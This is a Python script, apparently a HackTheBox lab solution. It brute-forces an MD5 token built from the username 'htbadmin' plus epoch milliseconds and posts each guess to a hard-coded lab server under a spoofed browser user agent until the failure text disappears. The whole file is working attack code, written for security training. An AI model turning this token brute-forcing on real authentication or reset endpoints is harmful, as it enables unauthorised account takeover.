"""import necessary modules"""
from hashlib import md5
# from time import time
import requests


# change base url as needed
BASE_URL:str = "http://83.136.255.150:33588/"
# change path as needed
URL: str = BASE_URL + "question1/"
HTB_ADMIN: str = "htbadmin"

# unix epoch time in seconds multiplied by 1000 to get milliseconds
# current_time: int = int(time() * 1000)
# manually enter the epoch time instead
current_time:int = 1714963681 * 1000

# time +/- 1 second in milliseconds
start_time: int = current_time - 1001
end_time: int = current_time + 1001
FAIL_TEXT: str = "Wrong token."

# loop from start_time to end_time
def gen_md5_token(username: str) -> str:
    """generate md5 tokens and store them in a list"""
    md5_tokens: dict[str, str] = {}
    for i in range(start_time, end_time):
        # get md5 token
        user_concat_epoch: str = username + str(i)
        # print(user_concat_epoch)  # print debugging
        md5_token: str = md5(user_concat_epoch.encode()).hexdigest()
        md5_tokens[str(i)] = md5_token
    # print(md5_tokens)  # debug print
    return md5_tokens


def send_md5(md5dict: dict[str, str]) -> bool:
    """Post request to URL using md5 list values and return True if correct hash is found."""

    correct_hash_found: bool = False

    # construct the post data for the http requests
    for i in md5dict:
        # define http headers
        HTTP_HEADERS: dict[str, str] = {
            "Origin" : BASE_URL,
            "Content-Type" : "application/x-www-form-urlencoded",
            "Referer" : URL,
            # fake user agent presenting as a chromium browser. change as needed
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        }

        data = {
            "token" : md5dict[i].strip("\n"),
            "submit" : "check"
        }

        # inform the user via terminal output
        print(f"[*] Checking epoch {i} with md5 hash: {md5dict[i]}")

        try:
            # send the http post request
            res: str = requests.post(URL, headers=HTTP_HEADERS, data=data, timeout=30)
            # print(res.request.body)  # print debugging
            # print(res.text)  # print debugging

            # check if fail message is in the response
            if FAIL_TEXT not in res.text:
                print(f"[+] Correct hash found {md5dict[i]}!")
                correct_hash_found: bool = True
                break  # exit the loop if correct hash is found

        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

    return correct_hash_found


def main() -> None:
    """main function to execute"""
    hash_dict: dict[str,str] = gen_md5_token(HTB_ADMIN)
    send_md5(hash_dict)

if __name__ == "__main__":
    main()
